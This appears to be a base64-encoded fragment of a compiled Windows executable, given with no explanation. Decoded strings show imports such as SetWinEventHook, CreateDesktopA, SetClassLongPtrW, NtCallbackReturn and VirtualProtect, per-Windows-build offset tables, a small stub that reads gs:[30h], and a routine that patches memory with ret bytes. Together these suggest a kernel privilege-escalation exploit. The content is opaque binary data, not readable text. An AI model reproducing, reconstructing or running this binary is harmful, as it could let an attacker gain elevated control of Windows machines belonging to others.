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AAAAA3EoAAAAAAADqSgAAAAAAAPxKAAAAAAAADksAAAAAAAAeSwAAAAAAACxLAAAAAAAAQEsAAAAAAABQSwAAAAAAAGRLAAAAAAAAdEsAAAAAAACISwAAAAAAAJpLAAAAAAAAqksAAAAAAAC6SwAAAAAAAM5LAAAAAAAA3EsAAAAAAADuSwAAAAAAAFxKAAAAAAAAAAAAAAAAAADWRwAAAAAAAMhHAAAAAAAASE0AAAAAAAAAAAAAAAAAAHZMAAAAAAAAikwAAAAAAACaTAAAAAAAAL5MAAAAAAAA0kwAAAAAAADkTAAAAAAAAPJMAAAAAAAAAE0AAAAAAAA+TAAAAAAAACJMAAAAAAAACkwAAAAAAABWTAAAAAAAAAAAAAAAAAAAxAJfc253cHJpbnRmAADpAl9zdHJpY21wAABtc3ZjcnQuZGxsAADGAUdldEN1cnJlbnRQcm9jZXNzAHcCR2V0U3lzdGVtRGlyZWN0b3J5VwAbAkdldE1vZHVsZUhhbmRsZUEAAD4DTG9hZExpYnJhcnlBAAC7Akdsb2JhbEFsbG9jAMICR2xvYmFsRnJlZQAAegJHZXRTeXN0ZW1JbmZvAHUAQ29weUZpbGVXABADSXNXb3c2NFByb2Nlc3MAANYEVGxzU2V0VmFsdWUA1wJIZWFwRnJlZQAACAVXYWl0Rm9yU2luZ2xlT2JqZWN0AMsBR2V0Q3VycmVudFRocmVhZElkAADABFNsZWVwANMCSGVhcEFsbG9jAMMEU2xlZXBFeADVBFRsc0dldFZhbHVlAIIAQ3JlYXRlRXZlbnRBAACdBFNldFRocmVhZEFmZmluaXR5TWFzawDDA1JlYWRGaWxlAADVAkhlYXBDcmVhdGUAAP4EVmlydHVhbFByb3RlY3QAAIoEU2V0UHJpb3JpdHlDbGFzcwAApgRTZXRUaHJlYWRQcmlvcml0eQCPAENyZWF0ZUZpbGVXABYEUmVzdW1lVGhyZWFkAACIAENyZWF0ZUZpbGVBAHYCR2V0U3lzdGVtRGlyZWN0b3J5QQDPBFRlcm1pbmF0ZVRocmVhZADTBFRsc0FsbG9jAADXAERlbGV0ZUZpbGVXAFIAQ2xvc2VIYW5kbGUAtABDcmVhdGVUaHJlYWQAAPcBR2V0RmlsZVNpemUAUQJHZXRQcm9jZXNzSGVhcAAA1ARUbHNGcmVlAEtFUk5FTDMyLmRsbAAACwNVbmhvb2tXaW5FdmVudAAAygJTZXRXaW5FdmVudEhvb2sAagBDcmVhdGVNZW51AAA+AlBvc3RRdWl0TWVzc2FnZQAJAEFwcGVuZE1lbnVBAIsCU2V0Q2xhc3NMb25nQQCxAlNldFBhcmVudAB/AlNlbmRNZXNzYWdlQQAACQNUcmFuc2xhdGVNZXNzYWdlAABtAENyZWF0ZVdpbmRvd0V4QQCkAERlc3Ryb3lNZW51AJsARGVmV2luZG93UHJvY0EAAFMCUmVnaXN0ZXJDbGFzc0EAAA8BR2V0Q2xhc3NMb25nQQDsAlNob3dXaW5kb3cAAMUCU2V0VGhyZWFkRGVza3RvcAAAEwFHZXRDbGFzc05hbWVBAI0CU2V0Q2xhc3NMb25nUHRyVwAAPAJQb3N0TWVzc2FnZUEAANACU2V0V2luZG93TG9uZ1B0clcAhwJTZXRBY3RpdmVXaW5kb3cA0wJTZXRXaW5kb3dQb3MAAKYARGVzdHJveVdpbmRvdwCuAERpc3BhdGNoTWVzc2FnZUEAAFwBR2V0TWVzc2FnZUEAWwBDcmVhdGVEZXNrdG9wQQAASgBDbG9zZURlc2t0b3AAAFVTRVIzMi5kbGwAAJUDUnRsSW1hZ2VSdmFUb1NlY3Rpb24AAKoBTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uAACiA1J0bEluaXRVbmljb2RlU3RyaW5nAAAxBFJ0bFF1ZXJ5RW52aXJvbm1lbnRWYXJpYWJsZV9VAJMDUnRsSW1hZ2VOdEhlYWRlcgAAiwNSdGxHZXRWZXJzaW9uAGICUnRsQWxsb2NhdGVBY3RpdmF0aW9uQ29udGV4dFN0YWNrANAATnRDYWxsYmFja1JldHVybgAAZQJSdGxBbGxvY2F0ZUhlYXAABwJOdFNldFRpbWVyAABKA1J0bEZyZWVIZWFwAP0ATnRDcmVhdGVUaW1lcgBudGRsbC5kbGwA+QFScGNTdHJpbmdGcmVlQQAACwJVdWlkVG9TdHJpbmdBAFJQQ1JUNC5kbGwAAIQEbWVtc2V0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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